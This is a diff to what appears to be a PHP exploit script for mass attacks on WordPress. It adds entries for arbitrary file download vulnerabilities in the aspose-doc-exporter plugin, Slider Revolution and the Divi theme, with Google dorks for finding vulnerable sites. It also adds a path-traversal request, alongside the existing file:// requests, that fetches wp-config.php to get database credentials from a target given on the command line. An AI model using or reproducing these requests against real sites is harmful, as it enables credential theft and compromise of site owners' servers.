@@ -123,6 +123,20 @@
 # Vendor Homepage:: http://codecanyon.net/item/justified-image-grid-premium-wordpress-gallery/2594251
 # Google Dork:: inurl:"/plugins/justified-image-grid"
 # ------------------------------------------------------------------------------
+# 
+# Wordpress aspose-doc-exporter Plugin Arbitrary File Download Vulnerability
+# Vendor Homepage:: https://wordpress.org/plugins/aspose-doc-exporter/developers/
+# ------------------------------------------------------------------------------
+# 
+# WordPress Slider Revolution Responsive <= 4.1.4 Arbitrary File Download vulnerability
+# Vendor Homepage:: http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380
+# Google Dork:: revslider.php "index of"
+# ------------------------------------------------------------------------------
+#
+# Wordpress Theme Divi Arbitrary File Download Vulnerability
+# Vendor Homepage:: http://www.elegantthemes.com/gallery/divi/
+# Google Dork:: inurl:wp-content/themes/Divi/
+# ------------------------------------------------------------------------------
 # http://i.imgur.com/45BFlNe.png
 # ===============================================================================
 
@@ -217,6 +231,8 @@ __request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=
 __request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php');
 
 __request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php');
+
+__request($argv[1], '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php');
 
 function __request($url, $plugin) {
 
